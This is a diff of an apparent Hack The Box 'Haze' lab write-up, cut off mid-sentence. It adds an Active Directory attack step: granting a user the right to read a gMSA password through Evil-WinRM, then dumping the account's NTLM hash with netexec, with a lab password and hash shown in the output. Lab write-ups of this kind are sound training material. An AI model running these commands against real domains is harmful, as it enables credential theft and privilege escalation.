@@ -429,7 +429,9 @@ Info: Download successful!
 
 So after looking around on bloodhound i see no outbound object control that tells me i can get the GMSA
 
-Ill try using bloodyAD to see if there is something i have to do first:
+Ill try using bloodyAD to see if there is something i have to do first
+
+# Dumping GMSA of the service account
 
 ```python
 bloodyAD -d haze.htb --host dc01.haze.htb -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' get writable 
@@ -454,4 +456,13 @@ So i have write access on this, so i should be able to add the right to make it 
 ```python
 *Evil-WinRM* PS C:\Users\mark.adams\Desktop> Set-ADServiceAccount Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"
 ```
-Now i cho
+Now i should be able to dump it.
+
+```python
+nxc ldap dc01.haze.htb -u mark.adams -p 'Ld@p_Auth_Sp1unk@2k24' --gmsa
+LDAP        10.129.11.223   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.11.223   389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [*] Getting GMSA Passwords
+LDAP        10.129.11.223   389    DC01             Account: Haze-IT-Backup$      NTLM: 76da32697ff38bc7c9fa6289abf47940     PrincipalsAllowedToReadPassword: mark.adams
+```
+Now i have the NTLM of the s
